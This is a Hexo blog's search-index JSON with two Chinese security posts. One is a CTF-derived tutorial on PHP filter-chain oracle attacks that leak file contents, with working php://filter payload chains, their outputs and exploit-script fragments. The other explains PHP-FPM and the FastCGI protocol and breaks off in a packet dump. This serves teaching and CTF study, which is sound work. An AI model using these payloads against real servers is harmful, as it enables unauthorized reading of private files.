{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://m1racle20.github.io","root":"/"},"pages":[{"title":"","date":"2024-10-01T02:31:20.618Z","updated":"2024-10-01T02:31:20.618Z","comments":true,"path":"PY.html","permalink":"http://m1racle20.github.io/PY.html","excerpt":"","text":""},{"title":"文章归档","date":"2024-10-01T02:30:34.869Z","updated":"2024-10-01T02:29:55.280Z","comments":true,"path":"archive.html","permalink":"http://m1racle20.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"PHP Filter链——基于oracle的文件读取攻击","date":"2024-10-07T13:35:38.907Z","updated":"2024-05-26T11:55:53.356Z","comments":true,"path":"2024/10/07/PHP Filter链——基于oracle的文件读取攻击/","permalink":"http://m1racle20.github.io/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/","excerpt":"","text":"简介​ 一开始见这题今年红明谷的ezphp,利用文件包含来进行测信道攻击获得flag.php的源码,接着利用匿名类来执行命令.不过最初的原题是DownUnder CTF 2022 1&lt;?php file($_POST[0]); ​ file读取一个文件，但不输出其内容.最终解法就是通过测信道攻击,用报错来预测根目录的flag的文件内容. 一.攻击原理大致分为3步: 通过iconv函数编码导致php产生内存报错 利用dechunk来确定文件第一个字符 利用能改变字节顺序的编码,利用iconv将剩余字符与第一个字符交换 1.通过编码来使PHP产生内存错误​ 众所周知,PHP Filter 当中有一种 convert.iconv 的 Filter ,可以把数据从字符集A转换成字符集B 例:php://filter/convert.iconv.&lt;source-encoding&gt;.&lt;target-encoding&gt;/resource=&lt;filename&gt; 核心:convert.iconv.L1.UCS-4LE 编码 UCS-4编码使用固定4个字节来表示每个字符,其中UCS-4LE即:使最低有效字节存储在最前面 123php -r &#x27;$string = &quot;START&quot;; echo strlen(iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string)).&quot;\\n&quot;;&#x27;输出20php -r &#x27;$string = &quot;START&quot;; echo iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;,iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string));&#x27; | xxd ​ 在php中,php.ini的memory_limit参数代表了资源限制,默认值为128MB,如果试图读取大于128MB的文件时就会触发内存错误. 123456789&lt;?phpini_set(&#x27;memory_limit&#x27;, &#x27;128M&#x27;);$string = &quot;START&quot;;for ($i = 1; $i &lt;= 13; $i++) &#123; $string = iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string);&#125; 例如这串代码,将字符串START使用了13次UCS-4LE编码,产生内存错误 2.使文件泄露第一个字符​ 在php文档中可以找到php filter dechunk这里,其中对字符处理时有限制,只能处理a-fA-F0-9这个区间中,这是因为对于http中的chunk编码是以16进制来表长度的,所以16进制字符范围在a-fA-F0-9这个范围内. ​ 根据源码可知,php支队第一个字节进行判断,第二个字节无关紧要. 12345678php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,a&quot;));string(0) &quot;&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,g&quot;));string(1) &quot;g&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ga&quot;));string(2) &quot;ga&quot;php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ag&quot;));string(0) &quot;&quot; 可以发现,在使用dechunk filter时,如果我们要编码的字符第一个字节不在16进制编码范围内,php回原样输出,在范围内的话会输出为空. ​ 因为dechunk存在着判断的机制,所以我们可以利用这个机制来作为我们的oracle攻击,此外,我们开可以配合前面的convert.iconv.L1.UCS-4LE 编码,经过多段convert.iconv.L1.UCS-4LE 编码后,如果我们想要泄漏的字符串内容开头的字符范围在16进制编码范围内,因为有dechunk编码会清空字符串,就不会产生内存报错,如果不在就会继续原样输出最后导致报错. 12345678当前flag文件首字母为avar_dump(file_get_contents(&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));不报错再加一层var_dump(file_get_contents(&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));报错var_dump(file_get_contents(&quot;php://filter/dechunk/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;));不报错 所以我们目前可以判断文件中的第一个字符是否在16进制编码这个范围内了,不过现在只能判断第一个字节,接下来就是处理剩余的字节了. 3.泄露剩余字节 a.处理前4个字节​ 目前我们可以判断第一个字节了,由于我们使用的时php:&#x2F;&#x2F;filter,那么有没有一种编码可以交换字符串中的字符位置呢? 以此为目的我们可以寻找到: convert.iconv.CSUNICODE.UCS-2BE这个编码规则,将unicode转成ucs-2BE,利用这个编码规则我们可以前后交换每两个字节的位置,将他称为r2 例如: 12var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;));string(6) &quot;badcfehg&quot; 使用 convert.iconv.UCS-4LE.10646-1:1993 我们可以将每四个字节的位置逆序，我们称这个编码规则为 r4 12var_dump(file_get_contents(&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;));string(8) &quot;dcbahgfe&quot; 所以我们现在可以找到源字符串中的第一个,第二个和第四个字节,那么第三个以及其他字节呢? 对于第三个字节,我们可以先将他r2,再进行一次r4即可把c放在第一位: 12 var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;));string(8) &quot;cdabghef&quot; 这样前4个字节我们都可以判断了,但是之后的呢?似乎不能通过r2和r4规则来放到前半部分, ​ 这时我们可以想到之前的filterchain知识,利用filter协议通过各种编码规则组合来对空文件进行写入一句话木马.当时利用的是PHP再处理BASE64字符串时会完全忽略非法字符,我们可以通过一些编码规则来将非法字符添加到字符串最前端,再利用r2&#x2F;r4组合交换顺序,再利用base64decode清除非法字符即可完成把后续字符交换到前面的操作了. 例如convert.iconv.CSUNICODE.CSUNICODE 编码规则,它可以将字符串最前端加上0xff0xfe 1234567891011121314var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;));string(8) &quot;��abcdef&quot;// 使用 r4 进行移位var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;));string(8) &quot;ba��fedc&quot;// 使用 base64 去掉冗余位var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;));string(8) &quot;bafedQ==&quot;// 再次使用 r4 交换位置var_dump(file_get_contents(&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;));string(8) &quot;efab==Qd&quot; 不过这里还有一个问题,这里测试的时候用的是6个字节,因为r4编码规则对字节有要求,一定要4个字节为一组,所以我们需要想一些其他办法. b.对于base64两个等号的处理回顾一下上述过程,r4编码规则有两处利用点: 一个是产生填充字符后进行交换,标记为(1). 一个是利用base64消除填充字符后,标记为(2). 对于(1),对于要移位的字符串,我们尽可能让他长度满足4*n-2即可,但是我们根本不知道字符串原本长度是多少. ​ 不过好在base64编码长度都是4*n个字节,但是我们还是需要另外两个字节,因为再base64编码中,分组编码完成后,不足分组编码的会使用&#x3D;进行填充,所以我们可以利用这两个等号来进行一定的变换操作,使得其他字节不变的情况下满足4*n-2的长度条件. 题目作者找到了这个filter: 12var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,==&quot;));string(24) &quot;+---AD0-3D3D+---AD0-3D3D&quot; **这个filter会固定将两个等号转换成另一个长度为24的字符串,*所以原本的字符串长度就变为 *4n-2+24 &#x3D; 4*(n+6) - 2* 也是符合了我们上述的长度要求！ 所以我们现在以abcdefghij&#x3D;&#x3D;来测试一下 12345678910111213141516// 将等号进行转换var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,abcdefghij==&quot;));string(34) &quot;abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;// 在前端添加冗余字符串var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdefghij==&quot;));string(36) &quot;��abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;// 使用 r4var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefghij==&quot;));string(36) &quot;ba��fedcjihg---+-0DAD3D3---+-0DAD3D3&quot;// 去除冗余var_dump(file_get_contents(&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdefghij==&quot;));string(28) &quot;bafedcjihg+0DAD3D3+0DAD3Dw==&quot; 经过这4步操作后,再利用一下r4即可将e放在第一个字节上. ​ 这4步流程在作者的原本脚本上本定义为一个flip操作,也就是一个flip流程包括:等号转换,添加冗余,r4转换,去除冗余四个步骤. c.移动所有位置​ 到目前为止,我们基本解决了8字节中的1-6位置的获取,至于7-8位,我们可以先进行一次r4,然后再次重复上述流程即可获得. 但是超过8字节的位置呢? 观察之前的上述操作,我们引入了冗余字节,最后又剔除了冗余字节,实际上我们每次进行flip操作后,后续的字节都会向前移动,所以我们进行的flip次数越多,我们就能拿到距离开头越远的字符. 例如: 12345abcd efgh ijkl mn== -&gt;flip-&gt; bafe dcji hg+0 DAD3 -&gt;r4-&gt;efab ijcd 0+gh -&gt;flip-&gt;feji ba+0 dcD3 -&gt;r4-&gt;ijef 0+ab 3Dcd 这样我们就可以获得第9位的字符,我们可以观察到规律,以ij为例,每次使用flip&#x2F;r4都会使这两个字符前进4个字节位置. 所以我们可以根据这个规律,对于下标为 n 的字符，只需要进行 n&#x2F;&#x2F;4 次 flip&#x2F;r4 组合就能将其位移到字符串的前端，最后前后可以使用 r4&#x2F;r2 进行微调就行 作者的脚本中这个算法为: 12345678def get_nth(n): global flip, r2, r4 o = [] chunk = n // 2 if chunk % 2 == 1: o.append(r4) o.extend([flip, r4] * (chunk // 2)) if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2) return join(*o) d.基于base64来预测​ 但以上的所有的理论都来自于一个条件,那就是一个拥有两个等号的base64字符串,如果我们将文件内容进行base64编码后并没有两个等号的话,以上就不成立了. ​ 所以我们的目标又回到了如何不依赖文件内容、同时也不能过度修改文件内容的情况下产生一个满足要求的 Base64 字符串。 又或者说,我们有没有办法检测源文件内容经过base64编码后是否有两个等号? ​ 到目前为止,我们又有能够判断服务器的某些条件的oracle只有dechunk,我们是不是可以利用这个 Oracle 来服务其他的判断条件呢？比如此处的等号. ​ 那么有没有一种编码格式可以对数字字母都无效，但是可以把等号变成其他更长字节长度的字符，使得长度过长从而导致服务器产生内存错误呢？ ​ 于是我们大概的想法是,如果该base64编码存在等号,经过某个编码使长度无限扩大最终导致服务器内存错误;如果没有等号,那么经过编码就不会导致服务器内存错误 根据目的来寻找编码:convert.quoted-printable-encode : ​ 这个编码会将一个&#x3D;编码成&#x3D;3D,从一个字节变成了3个字节,而对其他数字字母并不会生效,这完美符合了我们的需求. 所以我们现在的做法就是： 获取 Part 1 中 n 组 convert.iconv.L1.UCS-4LE 组合会致使服务器产生内存错误的临界值 n 使用 convert.base64-encode|convert.base64-encode 两次 Base64 编码对文件内容进行编码 使用大量的 convert.quoted-printable-encode 编码对上一步 Base64 结果中的等号进行数次编码 最后拼接上 n-1 组 convert.iconv.L1.UCS-4LE 组合 ​ 按照如上步骤，如果我们通过文件内容得到的 Base64 编码中含有两个等号，则会因为后续通过大量的 convert.quoted-printable-encode 编码扩展，拼接上原本不会让服务器产生内存错误的 n-1 组 convert.iconv.L1.UCS-4LE ，致使服务器产生了内存错误；如果没有等号，即使经过 大量的 convert.quoted-printable-encode 编码扩展也不会扩展字节，拼接上 n-1 组 convert.iconv.L1.UCS-4LE 也不会产生内存错误。完美~~! ​ 不过仍有问题,此时我们拥有了判断文件内容经过两次 Bae64 之后是否有等号的 Oracle 了，但是这仅仅只是判断有等号，这种情况还包括了 1 或者 2 个等号，况且，我们最终的目的还是需要获得拥有两个 &#x3D; 的 Base64 编码，仅仅只是能判断有没有等号还是不行。 e.找到特殊的base64​ 我们再仔细回顾一下 Base64 的编码规则，等号是由于 Base64 编码填充形成的，对于等号填充形式，基本上我们有三种状态：1 个等号、2 个等号、没有等号。而其实这几种状态又是可以相互转移的，我们分别考虑： 在没有等号的情况下，字符串长度 n ，总 bit 长度为 8*n 恰好为 Base64 分组 6的倍数，此时如果我们再添加 2+3*k (k&gt;=0) 个字节即可获得 1 个等号的填充；或者再添加 1+3*k (k&gt;=0) 个字节即可获得 2 个等号的填充 在有 1 个等号的情况下，字符串长度 n ，总 bit 长度为 8*n = 6*(n+2) - 8 = 6*n +4 ，此时如果我们再添加 2+3*k (k&gt;=0) 个字节即可获得 2 个等号的填充；或者再添加 1+3*k (k&gt;=0) 个字节得到没有等号填充的状态 在有 2 个等号的情况下，我们不需要额外填充 ​ 在我们上述的oracle攻击中,无法判断原来的内容编码后有多少个等号,但是我们可以通过判断出没有等号的情况，那么我们是不是可以通过没有等号的情况，将其转移成固定有两个等号的情况呢？ 所以我们接下来我们需要找到一个可以产生 1+3*k 或者 2+3*k 字节的编码形式。 这样的话选择就有很多了,例如 convert.iconv..CSISO2022KR 编码,可以在头部添加固定字符\\x1b$)C 这时就又回到我们状态转移的问题上来了，虽然我们无法判断有几个等号，但是我们可以判断没有等号的情况，而我们知道通过之前的 Oracle ，只有没有等号的情况是无法产生报错的，而这几种状态是可以相互转移的。 所以！我们只要覆盖这三种状态，判断出哪一种是没有等号的状态，再对其进行状态转移即可： 首先通过对原内容进行编码的为状态 1 ：convert.base64-encode|convert.base64-encode 通过增加了 1 次 4 字节冗余编码的为状态 2 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode 通过增加了 2 次 4 字节冗余编码的为状态 3 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode 因为根据上文对 Base64 编码规则的推断，每增加一次 4 字节冗余就能使得编码状态发生相应的转移，所以无论最初的状态 1 是什么，以上三种都能覆盖等号的三种状态。 然后我们再用之前提到的 Oracle 判断其中没有等号的状态，再将其转移到有 2 个等号的状态，就必定能产生满足我们有 2 个等号的 Base64 编码了！ 原作者脚本: 12345678910111213141516171819print(&#x27;detecting equals&#x27;)j = [ req(f&#x27;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;), req(f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;), req(f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;)]print(j)if sum(j) != 2: err(&#x27;something wrong&#x27;)if j[0] == False: header = f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;elif j[1] == False: header = f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;elif j[2] == False: header = f&#x27;convert.base64-encode|convert.base64-encode&#x27;else: err(&#x27;something wrong&#x27;)print(f&#x27;j: &#123;j&#125;&#x27;)print(f&#x27;header: &#123;header&#125;&#x27;) 4.处理剩余字节根据前三步,回顾一下我们解决了哪些问题 必定产生一个带有 2 个等号的 Base64 字符串 可以让字符串中任一字节移动到首位 可以利用 dechunk 判断字符串首位是否在 a-fA-F0-9 范围内 ​ 虽然完成了这三部分,但是我们现在只能判断字符是否在一个大概范围内,我们接下来的目的就是设法准确判断第一个字节. ​ 根据前文的思路,那么我们会想:是否存在这么一些 filter ，可以单独对每个字母生效将其转换到 a-fA-F0-9 的范围内呢？ ​ 比如假设有这么一个 1to1 的 filter ，它只对 z 字母有效，可以把 z 转换到 a 字符，对其他字母都不生效；这样一来，如果第一个字母是 z 的话，我们就可以利用这个 filter 将其转换到 a ，再利用最初的 Orcale 进行判断了，此时就不会产生内存错误；而如果不是 z 的话，就不会被转换，仍然产生内存错误。 ​ 不过要找到的话很难,我们可以退而求其次,先判断出一些字母,这些字母集合为 A ，其他另外某几个字母集合 B ，倘若有这么一个 filter 可以判断 A ∪ B ，但是因为集合 A 已经被我们排除了，所以这个 filter 尽管没有很满足我们 1to1 的要求，但是也能协助我们转换 B 集合部分的字母。 1234567rot1 = &#x27;convert.iconv.437.CP930&#x27;# 会将字母向后移动一位，所以称呼为 rot1 ，比如 a-&gt;b, b-&gt;c# 但是只对部分字母有效，初步测试为 a-h 范围，不包括数字，其他字母会有其他规则 i-&gt;q ，后续就不是 rot1 了rot13 = &#x27;string.rot13&#x27;# rot13 算法，向后移动 13 位tolower = &#x27;string.tolower&#x27;# 将大写字母转换成小写 利用string.tolower我们可以把所有大写字母转换成小写字母,这样我们只用分析小写字母和数字了 a-f由于a-f,0-9这个范围,我们可以直接通过dechunk来判断出范围. 接着通过一次rot1转换,,我们可以把f排除范围了, 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,a&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,e&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,f&quot;));string(1) &quot;g&quot; 接着判断a-e,由于rot1对a-e都生效,所以多次应用rot1即可逐个排除 但是我们怎么判断排除a-e之后剩下的是f呢?万一是数字呢?所以我们还需要找到一个对 f 生效，对数字不生效的 filter ，于是作者得到的 filter 如下： 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,f&quot;));string(0) &quot;&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,0&quot;));string(1) &quot;&quot;// ... 此处省略，该 filter 对于数字都会产生一个不可见字符var_dump(file_get_contents(&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,9&quot;));string(1) &quot;&quot; 这样我们就能判断字符f了. 此处作者脚本: 12345# a-efor n in range(5): if req(f&#x27;&#123;prefix&#125;|&#x27; + f&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;*(n+1) + f&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;): return &#x27;edcba&#x27;[n] break 使用了 be 编码，作者实际是较长的字符串进行判断的，在处理较长字符串的时候可能存在不可见字符等冗余问题需要去除 n-s i-k v-x借助rot13,可以将n-s转换成a-f 对于i-k在rot1编码规则中会将i-&gt;q,再次使用rot13可以得到d-f 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,i&quot;));string(1) &quot;q&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,j&quot;));string(1) &quot;r&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,k&quot;));string(1) &quot;s&quot; 借用rot13,可以将v-x转换成i-k的范围,然后复用上述步骤 此时我们解决了2*6+3*2=18个字母,还剩8个字母与数字来判断 检索数字​ 在 Base64 编码中，因为编码规则都是相对固定的，尤其是相对字符串第一个字节来说，因为在 Base64 分组的时候，第一个字节可以直接编码得到 Base64 编码中的第一位，以 1 为例，如下： 根据前面的我们现在可以判断所有字母了,也可以分清字母和数字了. 所以倘若我们把所有数字提取到第一位,并进行一次base64编码,得到的编码结果我们再去判断第一位是什么字母,就可以大概推出数字的范围: 1230-3 -&gt; M4-7 -&gt; N8-9 -&gt; O 然后我们再使用 r2 交换 Base64 的第二位，因为在 Base64 分组中，Base64 的第二位的高 bit 位仍然受到原文第一个字节的影响，所以根据编码结果第二位的范围我们就可以最终确定这个数字是什么了！例如 0-3 : 12340 -&gt; CDEFGH1 -&gt; STUVWX2 -&gt; ijklmn3 -&gt; yz* 当然仍然有可能编码结果下一位仍然是数字，例如 3s 编码结果为 M3M&#x3D; ，但是根据我们之前把 0-2 都排除了，剩余的就剩下是 3 了，所以依旧可以判断出来。 其余数字类似，就不再赘述。 至此,我们就完成了所有字符的翻译工作了,这个oracle文件读取攻击的原理也被阐述完全了","categories":[],"tags":[]},{"title":"攻击PHP-FPM","slug":"攻击PHP-FPM","date":"2024-09-27T02:59:24.811Z","updated":"2024-10-07T13:29:24.724Z","comments":true,"path":"2024/09/27/攻击PHP-FPM/","permalink":"http://m1racle20.github.io/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/","excerpt":"","text":"Nginx与PHP-FPMNginx​ Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。 PHP-FPM​ FPM（php-Fastcgi Process Manager）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。故名思义,FPM是管理FastCGI进程的,能够解析fastcgi协议。 ​ 其包含master和worker两种进程.master进程只有一个,负责监听端口,用来接收来自Web Sever请求,而worker进程一般会有多个,每个进程内部都嵌入了一个PHP解释器,是php真正执行的地方. php-fpm默认是unix socket连接,可以在配置文件中修改成tcp连接 Nginx与PHP-FPM通信Nginx通过反向代理将请求转给PHP-FPM解析. CGI与FastCGICGI​ CGI（Common Gateway Interface）通用网关接口,在CGI模式下,当web服务器收到http请求时,就会调用php-cgi进程,通过CGI协议,服务器把请求内容转换成php-cgi能够读懂的协议数据传递给CGI进程,CGI进程拿到内容后就会解析对应的php文件,得到结果在返回给web服务器,由web服务器再返回给客户端. ​ 但是在CGI模式下,每次客户端发起请求都需要建立和销毁进程,导致资源消耗很大.因为http要生成一个动态页面,系统就必须启动一个新进程以运行CGI程序,不断地fork是一项很耗时间和资源的工作,所以诞生了FastCGI模式. FastCGI​ FastCGI (Fast Common Gateway Interface)快速通用网关接口.FastCGi致力于减少网页服务器与CGI程序之间交互的开销,FastCGI每次处理完请求后,不会kill掉这个进程,而是保留进程,从而使服务器可以同时处理更多的网页请求. ​ 简而言之，CGI模式是Apache2接收到请求去调用CGI程序，而FastCGI模式是FastCGI进程自己管理自己的CGI进程，而不再是Apache去主动调用CGI进程，而FastCGI进程又提供了很多辅助功能比如内存管理、垃圾处理、保障了CGI的高效性，并且此时CGI是常驻在内存中、不会每次请求重新启动，从而使得性能得到质的提高. FastCGI协议分析 Tcpdump抓包Nginx中FastCGI协议 Fastcgi record​ FastCGI是一个通信协议,和HTTP协议一样,都是进行数据交换的一个通道. ​ 类比HTTP协议来说,fastcgi协议是服务器中间件和摸个语言后端进行数据交换的协议.fastcgi协议由多个record组成,record也有header和body,服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端,语言后端解码后得到具体数据,进行指定操作,并将结果在按照该协议封装好后返回给服务器中间件. ​ 和HTTP头不同的是,record的头固定8个字节,body是由头中的contentLength指定,结构如下: 1234567891011121314typedef struct &#123; /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength];&#125; FCGI_Record; ​ Header头由8个uchar类型的变量组成,每个变量1字节.其中,requestld占两个字节,一个是唯一的标志id,用来避免多个请求之间的影响;contenLength占两个字节,表示body的大小. ​ 在语言端解析了fastcgi头以后,拿到contentLength,然后再在TCP流中读取大小等于contentLenth的数据,这就是body体. ​ body后面还以一段额外的数据Padding,其中长度由头中的paddingLength指定,起保留作用.不需要该Padding的时候,将其长度设置为0即可 由此可见,一个fastcgi的record结构最大支持的body大小是2^16,65536字节. Fastcgi type​ 现在再来详细介绍一下fastcgi record中的type字节. ​ type就是指定该record的作用.因为fastcgi的一个record的大小是有限的,作用也是单一的,所以我们需要在一个TCP流中传输多个record,通过type来标志每个record的作用,用requestid作为同义词请求的id. ​ 所以在一次请求中，多个record的requestid是相同的。 type值的具体含义： ​ 看到这个图我们可以知道，在服务器中间件与后端交互时，第一个数据包record的type&#x3D;1，之后继续交互发送type&#x3D;4,5,6,7的record,结束时发送type&#x3D;2,3的record. 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应结构解析成key-value对，这就是php的环境变量，其结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940typedef struct &#123; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength]; unsigned char valueData[valueLength];&#125; FCGI_NameValuePair11;typedef struct &#123; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair14;typedef struct &#123; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength];&#125; FCGI_NameValuePair41;typedef struct &#123; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair44; 这其实是 4 个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用 FCGI_NameValuePair11 key大于128字节，value小于128字节，用 FCGI_NameValuePair41 key小于128字节，value大于128字节，用 FCGI_NameValuePair14 key、value均大于128字节，用 FCGI_NameValuePair44 抓包流量分析使用tcpdump抓取端口9000的包,追踪其tcp流: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878800000000 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 ........ ........00000010 01 04 00 01 05 47 01 00 0c 00 51 55 45 52 59 5f .....G.. ..QUERY_00000020 53 54 52 49 4e 47 0e 04 52 45 51 55 45 53 54 5f STRING.. REQUEST_00000030 4d 45 54 48 4f 44 50 4f 53 54 0c 21 43 4f 4e 54 METHODPO ST.!CONT00000040 45 4e 54 5f 54 59 50 45 61 70 70 6c 69 63 61 74 ENT_TYPE applicat00000050 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 ion/x-ww w-form-u00000060 72 6c 65 6e 63 6f 